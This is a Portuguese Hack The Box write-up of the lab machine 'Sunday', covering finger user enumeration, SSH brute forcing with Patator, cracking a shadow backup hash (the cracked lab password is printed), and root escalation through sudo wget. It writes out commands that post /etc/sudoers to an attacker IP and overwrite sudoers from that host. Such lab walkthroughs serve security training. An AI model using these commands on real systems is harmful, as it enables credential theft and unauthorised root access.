---
title: "Hack The Box - Sunday"
tags: [Solaris,Easy,Finger,Wget,Sudoers,Patator,SSH Brute Force]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/136>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas

> Porta 79 -> Serviço Finger

> Porta 111 -> Servidor RPC

## Nmap em todas as portas, já que encontramos apenas duas portas abertas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_nmap-Full.png)

Encontramos uma porta "estranha" aberta, a 22022

Verificamos o que tem nela com o nc

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_nmap-Full1.png)

Sevidor SSH! Muito bom, será útil quando encontrarmos credenciais!

## Enumeração Finger

Temos dois métodos para Enumeração do serviço Finger

O primeiro deles é pelo Metasploit Framework

### Metasploit Framework

Usaremos a wordlist padrão que vem dele só pra verificar mesmo o funcionamento

> use auxiliary/scanner/finger/finger_users

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_msf.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_msf1.png)

### Sem o Metasploit Framework

Temos um script para execução dessa enumeração também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_fing.png)

> https://github.com/pentestmonkey/finger-user-enum

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_fing1.png)

Baixamos ele para nossa Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_fing2.png)

Executamos ela

> ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_fing3.png)

Encontramos o usuário "sunny"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_fing4.png)

# Exploração

Essa máquina é estranha por que temos que "adivinhar" diversas coisas, uma é a senha desse usuário sunny, no caso seria sunday a senha... Sei lá, não consegui encontrar nexo a não ser adivinhação.

Logamos via SSH na porta 22022 encontrada no nmap full scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_ssh.png)

Poderiamos "descobrir" a senha fazendo um Brute Force no servidor SSH, não é recomendável pq geralmente servidores SSH dão block em várias tentativas, mas vale a pena utilizar desse exemplo pra explicar o funcionamento da ferramenta `Patator`

## SSH Brute Force Patator

> https://github.com/lanjelot/patator

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_pat.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_pat1.png)

Baixamos pra Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_pat2.png)

### Utilizando o Patator

Iremos utilizar uma wordlist pequena, apenas para ilustrar o funcionamento

`find . -type f -exec wc -l {} \; | sort -nr`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_wl0.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_wl.png)

> python patator.py ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:fgrep='failed'

(Fiquei sem saco de esperar pra caramba e fiz um Wordlist com poucas palavras e uma delas é a senha que ele encontrou)

A taxa é 2 logins por segundo, então demora um tempo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_patator.png)

# Escalação de Privilégio para Sammy

Ao entramos na máquina, testamos o `sudo -l`

Verificamos que podemos executar o /root/troll

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_sunny.png)

Executamos mas não conseguimos nada além de strings, então por hora vamos ignorar isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_sunny1.png)

Verificamos dentro da pasta /backup podemos ler o shadow.backup

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_sunny1.png)

## Quebrando a senha do sammy

Então com nosso amigo John the Ripper realizamos a quebra desse hash

> john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

> sammy:cooldude!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_john.png)

## Escalando pro sammy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_sammy.png)

# Escalação para Root

Uma vez logado como sammy na máquina, verificamos as permissões de `sudo -l` dele

Verificamos que sammy pode executar wget como se root fosse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_sammy1.png)

## Primeiro modo - /root/troll

Vou explorar duas aqui, uma sabendo que o sammy executa o /root/troll como root, vou executar o /root/troll que eu criei na minha Kali com o usuário sunny, e esse troll será um shell, pq com o usuário sammy vou que pode dar wget como se root vou baixar ela pra máquina Sunday

Ta meio complexa a explicação mas vai ficar simples agora que vou demonstrar

1º Criar o arquivo troll na minha Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_troll.png)

2º Levantar um servidor Python HTTP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_troll1.png)

3º Com o usuário SAMMY dou um wget nesse troll e jogo ele para /root/troll

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_troll2.png)

4º Com o usuário SUNNY executo `sudo /root/troll` (Tem que ser bem rápido pq ele retorno o arquivo troll original)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_troll2.png)

## Segundo modo - wget no /etc/shadow

Como temos wget de root na máquina podemos fazer diversas coisas, uma delas é ler o arquivo shadow e tentar quebrar o hash do root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_shadow.png)

Outra delas é alterarmos o arquivo /etc/sudoers por exemplo, que é o que será feito aqui

Iremos "envenenar" o /etc/sudoers original com um alterado, dando permissão total de root para o usuário Sammy, que nós estamos logado

1º Passo é baixar o arquivo sudoers pra verificar como está a estrutura dele

> sudo wget --post-file=/etc/sudoers 10.10.16.119

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_sud.png)

2º Passo é alterar o sudoers baixado para dar permissão total para o Sammy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_sud1.png)

3º Passo é colocar novamente no servidor o arquivo /etc/sudoers comprometido

> sudo wget 10.10.16.119/sudoers --output-document=/etc/sudoers

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_sud2.png)

4º Logamos como root `sudo su`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_sud3.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sunday/S_root.png)
